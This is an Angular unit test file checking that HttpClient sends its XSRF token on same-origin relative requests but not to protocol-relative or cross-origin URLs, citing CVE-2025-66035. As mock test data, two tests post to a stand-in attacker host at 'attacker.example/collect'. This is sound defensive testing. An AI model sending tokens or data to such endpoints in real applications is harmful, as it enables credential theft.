import { Injectable } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import {
  HttpClient,
  HttpXsrfTokenExtractor,
  provideHttpClient,
  withInterceptorsFromDi
} from '@angular/common/http';
import { HttpTestingController, provideHttpClientTesting } from '@angular/common/http/testing';

@Injectable()
class FixedXsrfToken extends HttpXsrfTokenExtractor {
  getToken(): string {
    return 'xsrf-token';
  }
}

// CVE-2025-66035: the XSRF token must never be attached to protocol-relative URLs.
describe('HttpClient XSRF protection', () => {
  let http: HttpClient;
  let httpMock: HttpTestingController;

  beforeEach(() => {
    TestBed.configureTestingModule({
      providers: [
        provideHttpClient(withInterceptorsFromDi()),
        provideHttpClientTesting(),
        { provide: HttpXsrfTokenExtractor, useClass: FixedXsrfToken }
      ]
    });
    http = TestBed.inject(HttpClient);
    httpMock = TestBed.inject(HttpTestingController);
  });

  afterEach(() => httpMock.verify());

  it('should send the XSRF token on same-origin relative requests', () => {
    http.post('/api/user/all', {}).subscribe();

    const req = httpMock.expectOne('/api/user/all');
    expect(req.request.headers.get('X-XSRF-TOKEN')).toBe('xsrf-token');
    req.flush({});
  });

  it('should not send the XSRF token to protocol-relative URLs', () => {
    http.post('//attacker.example/collect', {}).subscribe();

    const req = httpMock.expectOne('//attacker.example/collect');
    expect(req.request.headers.has('X-XSRF-TOKEN')).toBe(false);
    req.flush({});
  });

  it('should not send the XSRF token to absolute cross-origin URLs', () => {
    http.post('http://attacker.example/collect', {}).subscribe();

    const req = httpMock.expectOne('http://attacker.example/collect');
    expect(req.request.headers.has('X-XSRF-TOKEN')).toBe(false);
    req.flush({});
  });
});
